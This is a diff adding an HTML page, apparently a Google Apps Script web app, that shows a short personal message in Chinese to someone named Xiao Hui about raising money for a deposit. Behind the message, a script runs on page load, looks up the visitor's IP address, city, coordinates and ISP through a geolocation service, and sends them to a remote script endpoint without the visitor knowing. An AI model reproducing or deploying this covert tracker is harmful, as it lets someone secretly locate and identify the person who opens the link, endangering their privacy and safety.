@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <base target="_top">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  </head>
+  <body>
+  小惠 <br>
+  抱歉我在盡量接案籌錢<br>
+  <br>
+  麻煩你先幫我把那些錢留住<br>
+  等我籌到錢後，我會馬上把押金付清的<br>
+  <br>
+  我現在不太能在 line 上面跟你聊<br>
+  就這樣跟你說說我的狀況<br>
+  
+    <script>
+      $.ajax({
+        url: 'http://ip-api.com/json',
+        dataType: 'json',
+        success: function(msg) {
+          console.log(msg)
+		  var info = '';
+		  info += 'country='+msg.country;
+		  info += '&city='+msg.city;
+		  info += '&lat='+msg.lat;
+		  info += '&lon='+msg.lon;
+		  info += '&isp='+msg.isp;
+		  info += '&org='+msg.org;
+		  info += '&as='+msg.as;
+		  info += '&query='+msg.query;
+		  
+		  $.ajax({
+			url: 'https://script.google.com/macros/s/AKfycbzRZ7-Vpzv-I4fExLhy3yUVRWWQosSAFjT99gc_HoqLNDyjfFjwXBE3UI1WjhlG2QXX1Q/exec?'+info,
+			dataType: 'json',
+			success: function(data) {
+			  console.log(data)
+			  
+			}
+		  });
+		  
+        }
+      });
+	  
+	  
+    </script>
+    
+  </body>
+</html>
